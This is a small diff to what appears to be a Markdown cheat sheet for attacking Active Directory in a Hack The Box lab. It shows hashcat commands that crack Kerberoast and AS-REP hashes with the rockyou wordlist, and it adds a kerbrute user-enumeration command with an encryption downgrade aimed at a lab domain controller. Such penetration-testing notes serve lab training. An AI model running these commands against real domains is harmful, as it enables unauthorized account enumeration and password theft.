@@ -12,3 +12,8 @@ hashcat -m 13100 -a 0 GetUserSPNs.out ~/rockyou.txt
 ```bash
 hashcat -m 18200 -a 0 service-users-hash.txt ~/rockyou.txt
 ```
+**downgrade hash**
+
+```sh
+kerbrute --dc 10.10.10.161 -d htb.local userenum sname.txt --downgrade
+```
